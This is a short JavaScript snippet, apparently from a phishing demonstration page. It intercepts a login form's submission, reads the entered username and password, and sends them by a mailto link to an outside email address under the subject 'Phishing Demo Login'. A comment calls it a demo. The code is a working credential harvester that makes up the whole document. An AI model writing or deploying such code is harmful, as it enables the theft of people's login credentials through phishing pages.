document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    // Send details to email using a mailto link (for demo purposes, not secure)
    window.location.href = `mailto:omerblau@gamil.com?subject=Phishing%20Demo%20Login&body=Username:%20${encodeURIComponent(username)}%0D%0APassword:%20${encodeURIComponent(password)}`;
});
